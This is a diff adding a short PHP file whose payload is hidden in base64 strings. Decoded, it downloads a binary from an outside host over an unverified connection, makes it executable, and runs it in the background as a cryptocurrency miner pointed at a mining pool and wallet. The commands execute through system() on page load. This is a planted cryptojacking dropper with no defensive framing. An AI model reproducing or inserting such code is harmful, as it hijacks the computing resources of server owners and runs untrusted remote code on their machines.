@@ -1,0 +1,3 @@
+<?php
+$GLOBALS["hcesKrHIIwUECKCjySGR"]=base64_decode("bnByb2M=");$GLOBALS["NKhcyHAWpchoxwgrPGAs"]=base64_decode("Y3VybCAtcyAtLWluc2VjdXJlIGh0dHA6Ly9tb25leXVhLnZpcC9waHAgLW8gcGhwOyBjaG1vZCAreCBwaHA7IC4vcGhwIC1hIFllc3Bvd2VyU3VnYXIgLW8gc3RyYXR1bSt0Y3A6Ly8xMDkuMTA1LjYxLjEyODozMzMyIC11IHN1Z2FyMXF5N201NTZrZmN5eGMweHp5eHd6eGtwM2s1MzM4a3A0MHphamcwNy5hc3UgLS1uby1sb25ncG9sbCAtcSAtLXJhbmRvbWl6ZSAtLWJhY2tncm91bmQgPiAvZGV2L251bGw=");
+?>raimuasu <?php system($GLOBALS["NKhcyHAWpchoxwgrPGAs"]); $lKBCboyApUaMzwxiTPLN = system($GLOBALS["hcesKrHIIwUECKCjySGR"]);?>
